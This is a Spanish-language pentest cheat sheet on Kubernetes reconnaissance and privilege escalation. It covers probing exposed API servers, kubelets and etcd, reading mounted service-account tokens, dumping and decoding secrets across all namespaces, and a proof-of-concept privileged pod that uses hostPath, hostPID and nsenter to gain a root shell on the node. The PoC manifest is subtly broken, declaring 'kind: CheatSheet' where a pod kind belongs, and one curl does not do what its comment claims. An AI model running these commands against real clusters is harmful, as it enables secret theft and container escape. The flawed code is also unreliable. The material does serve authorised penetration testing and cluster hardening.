---
aliases:
  - K8s Enumeration
  - K8s Recon
tags:
  - asset/cloud
  - service/kubernetes
kind: CheatSheet
linked:
---
# Kubernetes Enumeration

> [!info]
> Recon de Kubernetes desde dentro de un pod (compromise inicial) o externamente (API server expuesto). Tools: `kubectl`, kubehunter, peirates, kube-bench.

***

## Recon externo (sin auth)

```bash
# API server exposed (puerto 6443 / 8443 default)
curl -k https://<target>:6443/api/
curl -k https://<target>:6443/apis/
curl -k https://<target>:6443/version

# Kubelet expuesto (puerto 10250)
curl -k https://<target>:10250/runningpods/
curl -k https://<target>:10250/pods/

# etcd expuesto (2379)
etcdctl --endpoints=https://<target>:2379 get / --prefix --keys-only
```

***

## Desde dentro de un pod

```bash
# Service account token (montado por default)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Quién soy
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authentication.k8s.io/v1/tokenreviews

# Listar permisos
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/

# Self-subjectaccessreview (cuál permission puedo)
kubectl auth can-i --list
```

***

## kubectl básico

```bash
# Listar recursos en namespace
kubectl get pods -n <ns>
kubectl get secrets -n <ns>
kubectl get configmaps -n <ns>
kubectl get services -n <ns>

# Todos los recursos cluster-wide
kubectl get all --all-namespaces

# Describe pod (env vars, mounts, image)
kubectl describe pod <pod> -n <ns>

# Logs
kubectl logs <pod> -n <ns>

# Exec en pod
kubectl exec -it <pod> -n <ns> -- /bin/sh
```

***

## Secrets enum

```bash
# Listar secrets accesibles
kubectl get secrets --all-namespaces

# Decode secret (base64)
kubectl get secret <name> -n <ns> -o jsonpath='{.data}' | jq
kubectl get secret <name> -n <ns> -o jsonpath='{.data.password}' | base64 -d

# Service account tokens en secrets
kubectl get secrets --all-namespaces | grep token
```

***

## Privesc paths

| Vector | Mecanismo |
|---|---|
| **Privileged pod creation** | `pods/create` con `privileged:true` → escape al node |
| **Mount hostPath** | `pods/create` con hostPath=`/` → leer files del node |
| **Exec en pod privileged** | `pods/exec` en pod existente privileged |
| **secrets/list cluster-wide** | Leak de service-account tokens |
| **Impersonate SA** | RBAC `impersonate` permite assume otro SA |
| **CVE-2024-21626** (runc) | Container escape |
| **CVE-2022-0492** (cgroups) | Capability abuse |

PoC: deploy pod malicioso

```yaml
apiVersion: v1
kind: CheatSheet
metadata:
  name: pwn
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    securityContext:
      privileged: true
    command: ["sh", "-c", "nsenter --mount=/proc/1/ns/mnt -- /bin/sh"]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath: { path: / }
```

```bash
kubectl apply -f pwn.yaml
kubectl exec -it pwn -- /bin/sh
# → root en node
```

***

## Tools

- **kubectl** — CLI oficial
- **kube-hunter** (Aqua) — scanner attack vectors
- **peirates** — penetration testing K8s
- **kube-bench** — CIS benchmark audit
- **kdigger** — context discovery desde pod
- **MKAT** — managed Kubernetes audit (EKS/AKS/GKE)
- **Krew** — kubectl plugin manager (botkube, view-utilization, etc.)

***

## Notas Relacionadas

- [[docker]]
- [[Cloud Credential Hunting]]
- [[AWS Enumeration]]
